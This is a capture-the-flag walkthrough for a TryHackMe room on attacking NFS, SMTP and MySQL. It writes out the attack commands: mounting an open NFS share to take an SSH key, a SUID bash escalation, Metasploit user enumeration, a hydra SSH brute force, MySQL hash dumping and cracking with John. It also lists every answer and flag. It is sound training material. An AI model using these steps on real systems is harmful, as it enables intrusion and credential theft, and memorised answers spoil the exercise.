# Network Services 2 - TryHackMe

Enumerating and Exploiting More Common Network Services & Misconfigurations

## Overview

- **Room URL:** [https://tryhackme.com/room/networkservices2](https://tryhackme.com/room/networkservices2)
- **Difficulty:** Easy
- **Time to complete:** 60

## Walkthrough

### 1. Get Connected

_No hints needed!_

### 2. Understanding NFS

- <p>What does NFS stand for?<br /></p>

**=> Answer: `Network File System`**

- What process allows an NFS client to interact with a remote directory as though it was a physical device?<br />

**=> Answer: `Mounting`**

- What does NFS use to represent files and directories on the server?<br />

**=> Answer: `file handle`**

- <p>What protocol does NFS use to communicate between the server and client?<br /></p>

**=> Answer: `RPC`**

- <p>What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2<br /></p>

**=> Answer: `user id / group id`**

- <p>Can a Windows NFS server share files with a Linux client? (Y/N)<br /></p>

**=> Answer: `Y`**

- <p>Can a Linux NFS server share files with a MacOS client? (Y/N)</p>

**=> Answer: `Y`**

- <p>What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.<br /></p>

**=> Answer: `4.2`**

### 3. Enumerating NFS

- <p>Run an <strong>nmap</strong> scan of your choice.</p>
  <p>How many <strong>ports</strong> are open on the target machine?</p>

```bash
nmap -p- -sS -Pn -T5 <MACHINE_IP>
```

**=> Answer: `7`**

- <p>Which port contains the service we're looking to enumerate?</p>

**=> Answer: `2049`**

- <p>Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?</p>

![Guide image](./screenshots/network-services-2-1.png)

**=> Answer: `/home`**

- <p>Time to mount the share to our local machine!</p>
  <p>First, use "<em>mkdir /tmp/mount</em>" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.</p>
  <p>Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?</p>

```bash
mkdir /tmp/mount
sudo mount -t nfs IP:/home /tmp/mount/ -nolock
ls /tmp/mount
```

![Guide image](./screenshots/network-services-2-2.png)

**=> Answer: `cappucino`**

- <p>Interesting! Let's do a bit of research now, have a look through the folders. Which of these folde<strong>rs</strong> could cont<strong>a</strong>in keys that would give us remote access to the server?</p>

```bash
ls -la /tmp/mount/cappucino
```

![Guide image](./screenshots/network-services-2-3.png)

**=> Answer: `.ssh`**

- <p>Which of these keys is most useful to us?</p>

![Guide image](./screenshots/network-services-2-4.png)

**=> Answer: `id_rsa`**

- <p>Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".</p>
  <p>Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.</p>
  <p>Can we log into the machine using <em>ssh -i &lt;key-file&gt; &lt;username&gt;@&lt;ip&gt;</em> ? (Y/N)</p>

```bash
cp cappucino/.ssh/id_rsa ~/id_rsa
cd ~/
chmod 600 ./id_rsa
ssh -i ./id_rsa cappucino@<MACHINE_IP>
```

![Guide image](./screenshots/network-services-2-5.png)

**=> Answer: `Y`**

### 4. Exploiting NFS

- <p>Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?<br /></p>

**=> Answer: `s`**

- Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.<br />

**=> Answer: `-rwsr-sr-x`**

- <p>Great! If all's gone well you should have a shell as root! What's the root flag?<br /></p>

**=> Answer: `THM{nfs_got_pwned}`**

### 5. Understanding SMTP

- <p>What does SMTP stand for?<br /></p>

**=> Answer: `Simple Mail Transfer Protocol`**

- <p>What does SMTP handle the sending of? (answer in plural)<br /></p>

**=> Answer: `emails`**

- <p>What is the first step in the SMTP process?<br /></p>

**=> Answer: `SMTP Handshake`**

- What is the default SMTP port?<br />

**=> Answer: `25`**

- <p>Where does the SMTP server send the email if the recipient's server is not available?<br /></p>

**=> Answer: `smtp queue`**

- On what server does the Email ultimately end up on?<br />

**=> Answer: `POP/IMAP`**

- <p>Can a Linux machine run an SMTP server? (Y/N)<br /></p>

**=> Answer: `Y`**

- <p>Can a Windows machine run an SMTP server? (Y/N)</p>

**=> Answer: `Y`**

### 6. Enumerating SMTP

- <p>First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?<br /></p>

```bash
nmap -sS -T4 -A -p- <MACHINE_IP>
```

![Guide image](./screenshots/network-services-2-6.png)

**=> Answer: `25`**

- <p>Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this? </p><p>If you would like some more help or practice using Metasploit, TryHackMe has a module on Metasploit that you can check out here:</p><p><a href="https://tryhackme.com/module/metasploit" target="_blank">https://tryhackme.com/module/metasploit</a><br /></p>

```bash
msfconsole
```

**=> Answer: `msfconsole`**

- Let's search for the module "<span style="">smtp_version", what's it's full module name? <br /></span>

```bash
msf6 > search smtp_version
```

![Guide image](./screenshots/network-services-2-7.png)

**=> Answer: `auxiliary/scanner/smtp/smtp_version`**

- <p>Great, now- select the module and list the options. How do we do this?<br /></p>

```bash
msf6 > use auxiliary/scanner/smtp/smtp_version
msf6 auxiliary(scanner/smtp/smtp_version) > show options
```

![Guide image](./screenshots/network-services-2-8.png)

**=> Answer: `options`**

- <p>Have a look through the options, does everything seem correct? What is the option we need to set?<br /></p>

**=> Answer: `RHOSTS`**

- <p>Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?<br /></p>

```bash
msf6 auxiliary(scanner/smtp/smtp_version) > set RHOSTS <MACHINE_IP>
msf6 auxiliary(scanner/smtp/smtp_version) > exploit
```

![Guide image](./screenshots/network-services-2-9.png)

**=> Answer: `polosmtp.home`**

- <p>What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.<br /></p>

**=> Answer: `Postfix`**

- Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "<span style=""><i>smtp_enum</i></span><span style="">", what's it's full module name? </span>

```bash
msf6 auxiliary(scanner/smtp/smtp_version) > search smtp_enum
```

![Guide image](./screenshots/network-services-2-10.png)

**=> Answer: `auxiliary/scanner/smtp/smtp_enum`**

- <p>We're going to be using the <i>"top-usernames-shortlist.txt"</i> wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).</p><p>Seclists is an amazing collection of wordlists. If you're running Kali or Parrot you can install seclists with: "sudo apt install seclists" Alternatively, you can download the repository from <a href="https://github.com/danielmiessler/SecLists">here</a>. <br /></p><p>What option do we need to set to the wordlist's path?<br /></p><p> </p>

```bash
msf6 auxiliary(scanner/smtp/smtp_version) > use 0
msf6 auxiliary(scanner/smtp/smtp_enum) > show options
```

![Guide image](./screenshots/network-services-2-11.png)

**=> Answer: `USER_FILE`**

- <p>Once we've set this option, what is the other essential paramater we need to set?</p>

**=> Answer: `RHOSTS`**

- <p>Okay! Now that's finished, what username is returned?<br /></p>

```bash
# Note that if your machine has not installed SecLists, visit https://github.com/danielmiessler/SecLists to donwload
msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS <MACHINE_IP>
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > exploit
```

![Guide image](./screenshots/network-services-2-12.png)

**=> Answer: `administrator`**

### 7. Exploiting SMTP

- <p>What is the password of the user we found during our enumeration stage?<br /></p>

```bash
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV <MACHINE_IP> ssh
```

![Guide image](./screenshots/network-services-2-13.png)

**=> Answer: `alejandro`**

- <p>Great! Now, let's SSH into the server as the user, what is contents of smtp.txt<br /></p>

```bash
ssh administrator@<MACHINE_IP>

ls
cat smtp.txt
```

![Guide image](./screenshots/network-services-2-14.png)

**=> Answer: `THM{who_knew_email_servers_were_c00l?}`**

### 8. Understanding MySQL

- <p>What type of software is MySQL?<br /></p>

**=> Answer: `relational database management system`**

- <p>What language is MySQL based on?<br /></p>

**=> Answer: `SQL`**

- <p>What communication model does MySQL use?<br /></p>

**=> Answer: `client-server`**

- <p>What is a common application of MySQL?<br /></p>

**=> Answer: `back end database`**

- <p>What major social network uses MySQL as their back-end database? This will require further research.<br /></p>

**=> Answer: `Facebook`**

### 9. Enumerating MySQL

- As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?<br />

```bash
nmap -p- -sS -Pn -T5 <MACHINE_IP>
```

**=> Answer: `3306`**

- <p>We're going to be using the "mysql_sql" module.</p><p> Search for, select and list the options it needs. What three options do we need to set? (in descending order).<br /></p>

```bash
msfconsole
msf6 > search mysql_sql
msf6 > use 0
msf6 auxiliary(admin/mysql/mysql_sql) > show options
```

![Guide image](./screenshots/network-services-2-15.png)

**=> Answer: `PASSWORD/RHOSTS/USERNAME`**

- Run the exploit. By default it will test with the "select version()" command, what result does this give you?<br />

```bash
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS <MACHINE_IP>
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_sql) > exploit
```

![Guide image](./screenshots/network-services-2-16.png)

**=> Answer: `8.0.42-0ubuntu0.20.04.1`**

- <p>Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?<br /></p>

```bash
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL "show databases"
msf6 auxiliary(admin/mysql/mysql_sql) > exploit
```

![Guide image](./screenshots/network-services-2-17.png)

**=> Answer: `4`**

### 10. Exploiting MySQL

- <p>First, let's search for and select the "mysql_schemadump" module. What's the module's full name?<br /></p>

```bash
msf6 auxiliary(admin/mysql/mysql_sql) > search mysql_schemadump
```

**=> Answer: `auxiliary/scanner/mysql/mysql_schemadump`**

- Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?<br />

```bash
msf6 auxiliary(admin/mysql/mysql_sql) > use 0
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD password
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME root
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set RHOSTS <MACHINE_IP>
msf6 auxiliary(scanner/mysql/mysql_schemadump) > exploit
```

![Guide image](./screenshots/network-services-2-18.png)
![Guide image](./screenshots/network-services-2-19.png)

**=> Answer: `x$waits_global_by_latency`**

- Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name?

```bash
msf6 auxiliary(scanner/mysql/mysql_schemadump) > search mysql_hashdump
```

**=> Answer: `auxiliary/scanner/mysql/mysql_hashdump`**

- <p>Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?<br /></p>

```bash
msf6 auxiliary(admin/mysql/mysql_schemadump) > use 0
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS <MACHINE_IP>
msf6 auxiliary(scanner/mysql/mysql_hashdump) > exploit
```

![Guide image](./screenshots/network-services-2-20.png)
**=> Answer: `carl`**

- <p>Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called "hash.txt". </p><p>What is the user/hash combination string?<br /></p>

```bash
echo "carl:*EA031893AA21444B170FC2162A56978B8CEECE18" >> hash.txt
john hash.txt
```

**=> Answer: `carl:*EA031893AA21444B170FC2162A56978B8CEECE18`**

- <p>Now, we need to crack the password! Let's try John the Ripper against it using: "<i>john hash.txt</i>" what is the password of the user we found? <br /></p>

**=> Answer: `doggie`**

- <p>Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?<br /></p>What's the contents of MySQL.txt<br />

![Guide image](./screenshots/network-services-2-22.png)

**=> Answer: `THM{congratulations_you_got_the_mySQL_flag}`**

### 11. Further Learning

_No hints needed!_
